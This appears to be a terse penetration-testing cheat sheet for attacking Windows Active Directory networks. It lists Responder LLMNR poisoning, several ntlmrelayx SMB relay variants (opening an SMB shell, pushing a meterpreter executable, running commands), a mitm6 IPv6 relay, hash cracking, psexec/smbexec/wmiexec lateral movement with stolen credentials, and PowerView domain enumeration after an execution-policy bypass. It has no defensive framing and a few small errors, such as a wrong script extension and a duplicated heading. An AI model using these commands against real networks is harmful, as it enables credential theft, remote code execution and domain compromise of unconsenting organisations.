



## LMNR Poisoning

Responder responder -I eth0 -rdwv

## SMB Relay
`nmap --script=smb2-security-mode.sse -p445`

### Attack 1
http off smb off in responder.conf
```bash
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support
```

### Attack 2
http off smb off in responder.conf
```bash
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support -i # It will show SMB shell opned on port {PORT}
nc 127.0.0.1 {PORT}
```
SHELL command `shares` to get shares name and `use SHARENAME$` to get access.

### Attack 3
http off smb off in responder.conf
```bash
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support -e meterpreterShell.exe
```
### Attack 3
http off smb off in responder.conf
```bash
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

## IPV6 mitm6 Attack

`ntlmrelayx.py -6 -t ldaps://192.168.111 -wh sub.domain.tld -l loots`



## Hashcrack
### NTLMHash
hashcrack 5600
### Samhash


# Attacks with Credential

### Metasploit PSEXEC

use exploit `exploit/windows/smb/psexec` on metasploit
or
`psexec.py domain.tld/username:password@192.168.0.111`
or
`smbexec.py domain.tld/username:password@192.168.0.111`
or
`wmiexec.py domain.tld/username:password@192.168.0.111`


# Attacks After Compromise

## PowerView

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```powershell
powershell -ep bypass 
..\PowerView.ps1
```
```Powershell
Get-NetDomain  # DC info
Get-NetDomainController # DC Info
Get-NetDomainPolicy  # Domain Policy
Get-NetDomainPolicy.{system access} # Specific Policy By Name
Get-NetUser # User Details
Get-UserProperty #user property names
Get-UserProperty -Properties propertyname #specific property
Get-NetComputer -FullData
Get-NetGroup # Get Group Names
Get-NetGroupMember -GroupName "Domain Admin" # Get Group Mamber Names of Specific Group
Invoke-ShareFinder # Share Details

```




